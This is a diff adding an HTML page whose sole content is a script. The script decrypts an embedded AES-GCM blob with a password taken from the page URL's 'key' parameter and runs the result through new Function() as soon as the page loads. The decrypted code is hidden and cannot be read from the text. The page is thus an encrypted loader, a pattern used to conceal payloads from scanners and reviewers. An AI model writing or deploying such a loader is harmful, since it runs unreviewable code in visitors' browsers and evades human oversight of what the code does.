@@ -1,0 +1,84 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+  </head>
+  <body>
+    <script>
+const encryptedPayload = {
+  "salt": "Jl1ZPdlwLWKpDnOFh9C0Kg==",
+  "iv": "d1vifVJveAjNlh4S",
+  "data": "87SUUT/UkO7aVspiywmArkRt5giJ9Jx5vwKvThmn6lyqiyTzmYMzdhFwYCFNjK/ITtWYAn3iko3wODTWPfqpUlbV23r0qnDoCCk6iEHFxexYRLsFyV8clYh5k3iQ2GpAgCs0/MHd/TkLKo10AS1YmJqZnnRYG8nKqNVzACTPvJZuoFJd5ibXymcQRnuA5NTB05fLVdHbB+v+6HI6oKf3jwxawiOj03/RZB76y/rGTh/zeUnTkX0Xx23o2r7B5gSqaSkQlR7nR7QEhZga4X8kQOBA/NuA/aHkDzc8cYPC9xfgZ78Yn25eAOgjIdxb/LwbqVCEdD5kOkGJ5hncIRZVfZ6w1+fI1u/itWjBxN+HwfO6x5mfIwL8H7X1e018LJGs/qS2rgOfC/2TWynpp5vh/RTeC8HT6tR5fRDKUmRpvDJiN4KlZgR1xMB4k/N8eaFDnw8qtfDAvfbJ1ATNN2REjiFk1ScnrkmOpBwSPzctpqWHoV8S0jb/Lck4UmTfifw+sixZAjfBkcHqZh8fHSJ3dvzIgjvcIA858P7JpRVUecfzD7yuHV5yba5UJYIBK5Y/f6lyo6kkfLfOlbv9RHJnF4qu17EUphJMjqhiQuUap46/qB+4zgwPTo7uqRjnH/5WizeFpX9deB87ggjDZicuj/yUH/9L456QCubwDMTR0cZFB5OwiUzv7RtuTCNnpO9gwruJG+CKdu4k01PCvlGahAEx6FU4rKFHiiv4eGcueb8UeBjs5YPIU0y7jXHC/SIfSnEOwEDiCw8RvJOshD2H3IznBPbu10Xz1YCoBKN3dJ6Y08BOa+8aGIM22RNcL8XDtSb5HagZ8iPuMG4BoBKB5Y8ED6kQeLgAwh5C9vlIh3OV8tOBwAWZaYmJLv9OfRyShE9fy4u1vI+Vt4NmUqGac83ZGCpSgoJMAYoIPpr20JtlKvzJNWp0jU/1bT9fmGmF/KXj+hS87O0DFCXnDx1JkGviEB/e49CRVpMb45itrNcu7i808rvd0WGKHS655/AlCxbQfSw61veM/5ADUQJ6FzyTkc8DC8+Kk/k6PenALjDDdTw/0HkNaZBTQWF7jde9y8HgayZNDITjk36AzZcUl/8rjn70o4xxRVuPz3JlNxhxHTcb9Rvsoi/8iJ7ahcKiHsA06pPiQnEM+cGEhw+Mix3H6QaRouPCNap8wDfq5zBUB1F2HSash2jga5hqK14ykVtcrGMnaeItwU6oaZBT3yaHz6KG+6SvhlXSaJzfy55VAFlo3VPy5QhAp4sY48B/fSyIef1XIDQ+QQSD/tJqfik3J7L0gx9CNvJC/GGRQJm7dCQqsBVLXXHwy2/INuBG8lx8X9KKy7q6/YifN1btMm0T/5LSzpu8tDI5bpbl5s7sbhlLkIG9zQ/4+f/Hn4lxPqJhvCo4Bvpd98u2tafJ7/7vvzLUdIdxjUHs4FiGimdVRxsVAfjdnmBjMebGVQkctz7MDGNWrXdiNrjNLa/hcJ+bHo80ObBsSG1ioPm07732quU="
+};
+
+      function fromBase64(base64) {
+        return Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+      }
+
+      async function decryptString(payload, password) {
+        const enc = new TextEncoder();
+        const dec = new TextDecoder();
+
+        const salt = fromBase64(payload.salt);
+        const iv = fromBase64(payload.iv);
+        const data = fromBase64(payload.data);
+
+        const keyMaterial = await crypto.subtle.importKey(
+          "raw",
+          enc.encode(password),
+          "PBKDF2",
+          false,
+          ["deriveKey"]
+        );
+
+        const key = await crypto.subtle.deriveKey(
+          {
+            name: "PBKDF2",
+            salt,
+            iterations: 100000,
+            hash: "SHA-256"
+          },
+          keyMaterial,
+          {
+            name: "AES-GCM",
+            length: 256
+          },
+          false,
+          ["decrypt"]
+        );
+
+        const plainBuffer = await crypto.subtle.decrypt(
+          {
+            name: "AES-GCM",
+            iv
+          },
+          key,
+          data
+        );
+
+        return dec.decode(plainBuffer);
+      }
+
+      (async () => {
+        try {
+          const params = new URLSearchParams(location.search);
+          const key = params.get("key");
+
+          if (!key) {
+            document.body.innerText = "Missing key";
+            return;
+          }
+
+          const jsCode = await decryptString(encryptedPayload, key);
+
+          // Execute decrypted JavaScript
+          new Function(jsCode)();
+        } catch (e) {
+          document.body.innerText = "Invalid key or failed to decrypt";
+          console.error(e);
+        }
+      })();
+    </script>
+  </body>
+</html>
